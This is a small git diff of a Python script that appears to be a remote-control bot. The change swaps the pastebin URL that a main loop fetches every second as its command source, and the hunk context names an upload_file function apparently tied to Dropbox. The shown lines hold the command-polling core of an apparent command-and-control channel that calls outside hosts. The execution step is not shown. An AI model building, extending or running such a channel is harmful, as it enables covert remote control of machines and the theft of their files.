@@ -43,7 +43,7 @@ def upload_file(dbx, file_path: str):
 
 def main():
     # TODO: load from a file
-    cmd_url = "https://pastebin.com/raw/uVEccKPR"
+    cmd_url = "https://pastebin.com/raw/GwC3FJeB"
     while True:
         time.sleep(1)
         cmd = requests.get(cmd_url)
